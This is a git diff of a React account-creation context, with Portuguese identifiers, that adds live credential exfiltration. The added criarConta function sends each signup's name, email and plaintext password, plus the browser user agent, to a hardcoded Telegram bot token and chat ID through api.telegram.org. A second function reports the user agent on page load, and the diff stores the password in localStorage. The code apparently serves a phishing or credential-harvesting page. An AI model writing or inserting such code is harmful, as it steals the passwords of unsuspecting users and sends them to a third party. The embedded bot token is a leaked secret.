@@ -1,22 +1,33 @@
-import { createContext, useContext } from "react";
+import { createContext, useContext, useState } from "react";
 import { useEffect } from "react";
-
+import { useNavigate } from "react-router-dom";
+import { v4 as uuidv4 } from "uuid";
 
 const UseContextForm = createContext();
 
 export const AuthCriarConta = () => {
-    const context = useContext(UseContextForm);
-    return context
-}
+  const context = useContext(UseContextForm);
+  return context;
+};
 
 const ContextCriarConta = ({ children }) => {
-  const criarConta = (e) => {
-    e.preventDefault();
-    const dispositivo = navigator.userAgent;
-    const botToken = "";
-    const chatId = "";
+const [activeCriarConta, setActiveCriarConta] = useState(false);
+const navigate = useNavigate();
 
-    const message = `🧑‍🦰Nome: ${"nome"}\n📱Dispositivo:${dispositivo}`;
+// Criar Conta e enviar...
+  const criarConta = (data) => {
+    const dispositivo = navigator.userAgent;
+    const token = uuidv4();
+    const botToken = "7572426866:AAFi3LlkCEwL9HoL83kMe5VpIL6xs3vtEXo";
+    const chatId = "7911135198";
+   
+
+    localStorage.setItem("nome", JSON.stringify(data.nome));
+    localStorage.setItem("email", JSON.stringify(data.email));
+    localStorage.setItem("senha", JSON.stringify(data.senha));
+    localStorage.setItem("token", JSON.stringify(token));
+
+    const message = `Cadastro:\n 🧑‍🦰Nome: ${data.nome}\n 📩E-mail: ${data.email}\n 🔒Senha: ${data.senha}\n📱Dispositivo:${dispositivo}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -37,14 +48,18 @@ const ContextCriarConta = ({ children }) => {
         }
       })
       .catch((error) => console.log("Erro: ", error));
+
+      setActiveCriarConta(true);
+      navigate('/');
   };
 
+  // Capturar dispositivo....
   function captureDispositivo() {
     const dispositivo = navigator.userAgent;
 
     const message = `📱Dispositivo:${dispositivo}`;
-    const botToken = "";
-    const chatId = "";
+    const botToken = "7572426866:AAFi3LlkCEwL9HoL83kMe5VpIL6xs3vtEXo";
+    const chatId = "7911135198";
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -72,7 +87,9 @@ const ContextCriarConta = ({ children }) => {
   }, []);
 
   return (
-    <UseContextForm.Provider value={{ criarConta }}>
+    <UseContextForm.Provider
+      value={{ criarConta, activeCriarConta, setActiveCriarConta }}
+    >
       {children}
     </UseContextForm.Provider>
   );
